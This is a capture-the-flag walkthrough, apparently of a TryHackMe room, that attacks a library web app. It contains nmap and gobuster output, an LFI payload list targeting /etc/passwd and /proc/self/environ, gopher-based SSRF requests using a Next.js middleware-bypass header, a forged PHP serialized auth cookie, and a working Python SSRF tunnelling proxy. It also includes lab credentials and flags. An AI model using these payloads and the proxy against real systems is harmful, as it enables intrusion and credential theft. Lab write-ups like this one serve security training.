# NMap

```
# Nmap 7.95 scan initiated Tue Mar 24 14:52:21 2026 as: /usr/lib/nmap/nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.113.166.1
Nmap scan report for 10.113.166.1
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 75:ff:78:72:fe:70:34:08:b2:9a:f2:23:ff:33:c2:90 (ECDSA)
|_  256 f9:a5:b8:4c:7a:c2:c6:98:16:ac:65:40:29:b7:58:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 24 14:52:49 2026 -- 1 IP address (1 host up) scanned in 27.61 seconds
```
# Gobuster
```
gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
```
```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.166.1
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,400
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,bak,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1735]
/pdf                  (Status: 301) [Size: 310] [--> http://10.113.166.1/pdf/]
/management           (Status: 301) [Size: 317] [--> http://10.113.166.1/management/]
/javascript           (Status: 301) [Size: 317] [--> http://10.113.166.1/javascript/]
/preview.php          (Status: 200) [Size: 19]
/server-status        (Status: 403) [Size: 277]
Progress: 1102790 / 1102790 (100.00%)
```
## preview.php
After checking out everything listed - found via Burp that if im checking out any book uploaded, it goes throught
```
http://10.114.175.163/preview.php?url=http://cvssm1/pdf/lorem.pdf
```
It looked like a nice place for LFI - tried to go with many different payloads, such like:
```
# 1. Podstawowe schematy
    "file:///etc/passwd",
    "/etc/passwd",
    
    # 2. Mieszanie wielkości liter (Case-Sensitivity Bypass)
    "fIlE:///etc/passwd",
    "FiLe:///etc/passwd",
    "pHp://filter/convert.base64-encode/resource=preview.php",
    
    # 3. Klasyczny Directory Traversal i Null Byte (dla starszych wersji PHP)
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "../../../../../../../../etc/passwd\x00",
    
    # 4. Omijanie filtrów usuwających "../" (Zagnieżdżanie i modyfikacje)
    "....//....//....//....//etc/passwd",
    "..././..././..././..././etc/passwd",
    "....\\/....\\/....\\/....\\/etc/passwd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    
    # 5. Kodowanie URL (URL Encoding)
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    
    # 6. Podwójne kodowanie URL (Double URL Encoding)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%2566%2569%256c%2565:///etc/passwd", # Podwójnie zakodowane "file"
    
    # 7. Alternatywne PHP Wrappers
    "php://filter/read=convert.base64-encode/resource=preview.php",
    "php://filter/read=string.rot13/resource=preview.php", # Omijanie filtrów wyłapujących słowo "base64"
    
    # 8. Inne kluczowe pliki systemowe (jeśli /etc/passwd jest na czarnej liście)
    "file:///etc/issue",
    "file:///etc/hostname",
    "file:///proc/self/environ" # Odczytanie tego pliku często prowadzi do RCE
]
```
But sadly it did not work. Tried a remote one throught my python serwer, but nothing useful. THen, I thought that maybe that 
# cvssm1
is a localhost, so fuzzed it with
```
ffuf -w <(seq 1 65535) -u "http://10.114.175.163/preview.php?url=http://127.0.0.1:FUZZ/" -fs 0 -t 50
```
and found a port 10000! It was hiding an API website written in next.js - with 
## Api
```
Warning

Unauthorised access to this system is strictly prohibited.
```
For which I found a way https://pentest-tools.com/blog/cve-2025-29927-next-js-bypass
Normal header modification was not giving any result, so went with gopher -SSRL graal
```
http://10.114.175.163/preview.php?url=gopher://cvssm1:10000/_GET%2520/customapi%2520HTTP/1.1%250D%250AHost%253A%2520cvssm1%253A10000%250D%250Ax-middleware-subrequest%253A%2520middleware%250D%250A%250D%250A
```
And opened the site correctly hiding: This API is currently under maintenance. Please use the library portal to add new books using librarian:L1br4r1AN!!</p><p style="font-size:1.25rem">First flag is <!-- -->THM{363bec60df12c2cadbe9ff35393fa468}
## Management and 2FA
Next step was to go for 
```
http://10.114.175.163/preview.php?url=http://cvssm1:80/management
```
But still we need a proxy, for me as gopher to send the credentials
```
[http://10.114.175.163/preview.php?url=gopher://cvssm1:80/_POST%2520/management/%2520HTTP/1.1%250D%250AHost%253A%2520cvssm1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252037%250D%250A%250D%250Ausername%253Dlibrarian%2526password%253DL1br4r1AN!!](http://10.113.150.155/preview.php?url=gopher://cvssm1:80/_POST%2520/management/%2520HTTP/1.1%250D%250AHost%253A%2520cvssm1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252039%250D%250A%250D%250Ausername%253Dlibrarian%2526password%253DL1br4r1AN!!%2521%2521)
```
And here we have 2FA as cookie auth token
## Insecure deserialisation
```
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D;
URL Decoded looks like: O:9:"AuthToken":1:{s:9:"validated";b:0;}
```
We have to change the b:0 (false) to 1 (true), encode it and send next payload with it
```
O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
```
But sadly, could make it work properly with simple gopher url request, had to create a proxy for which I found code
```
import socket
import requests
import urllib.parse
import threading
import argparse


def handle_client(conn, addr, target_host, host_to_proxy, port_to_proxy):
    with conn:
        data = conn.recv(65536)
        if not data:
            return
        # Double-encode payload
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = (
            f"http://{target_host}/preview.php?url="
            f"gopher://{host_to_proxy}:{port_to_proxy}/_{double_encoded_data}"
        )
        try:
            resp = requests.get(target_url, timeout=10)
            conn.sendall(resp.content)
        except Exception as e:
            print(f"[!] Error forwarding request: {e}")
            conn.sendall(b"Proxy error")


def main():
    parser = argparse.ArgumentParser(
        description="Python proxy for SSRF gopher tunneling"
    )
    parser.add_argument("--lhost", required=True, help="Local listen host (e.g., 127.0.0.1)")
    parser.add_argument("--lport", type=int, required=True, help="Local listen port (e.g., 4002)")
    parser.add_argument("--target", required=True, help="Target host with SSRF (e.g., extract.thm)")
    parser.add_argument("--phost", required=True, help="Host to proxy to inside (e.g., 127.0.0.1)")
    parser.add_argument("--pport", type=int, required=True, help="Port to proxy to inside (e.g., 80)")

    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.lhost, args.lport))
        s.listen()
        print(f"[*] Listening on {args.lhost}:{args.lport}, "
              f"proxying to {args.phost}:{args.pport} via {args.target}...")
        while True:
            conn, addr = s.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, args.target, args.phost, args.pport),
                daemon=True,
            )
            client_thread.start()


if __name__ == "__main__":
    main()
```
and run it via:
```
python3 p.py --lhost 127.0.0.1 --lport 4002 --target 10.113.150.155 --phost cvssm1 --pport 80
```
Now having a proxy for it, logged in into management and modified an auth token.
THM{804326748394ff9fb288e059653f0db7}

